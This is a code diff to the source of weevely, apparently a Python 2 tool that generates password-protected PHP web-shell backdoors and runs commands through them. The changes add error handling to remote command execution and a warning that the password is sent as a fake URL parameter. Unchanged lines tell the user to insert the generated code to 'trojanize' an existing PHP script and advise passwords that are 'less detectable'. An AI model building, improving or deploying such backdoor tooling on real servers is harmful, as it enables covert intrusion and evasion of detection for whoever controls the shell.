@@ -52,7 +52,7 @@ class weevely:
 
       if 'pwd' not in locals():
 	if moderun=='g':
-	  print "+ Random alphanumeric password (like 'a33k44') are less detectable."
+	  print "+ Be careful: password is transmitted unencrypted as a fake url parameter.\n+ Random alphanumeric password (like 'a33k44') are less detectable."
 	  
 	pwd=''
 	while not pwd:
@@ -61,8 +61,12 @@ class weevely:
 
 	
 
-      if moderun=='c': 
-	self.execute(url,pwd,cmnd,0)
+      if moderun=='c':       
+	try:
+	  print self.execute(url, pwd, cmnd, 0)
+	except Exception, e:
+	  print '! Command execution failed: ' + str(e) + '.'
+	return
       if moderun=='t':
 	self.terminal(url,pwd)
       if moderun=='g':
@@ -111,7 +115,7 @@ class weevely:
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('test request doesn\'t produce a valid respond')
+	raise Exception('request doesn\'t produce a valid respond, check password or url')
       else:
 	return founded[0].strip()
     
@@ -153,7 +157,7 @@ class weevely:
     new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
     
     f_output.write(new_str)
-    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the php file as is. Exiting.'
+    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the PHP file as is. Exiting.'
      
     
 if __name__ == "__main__":
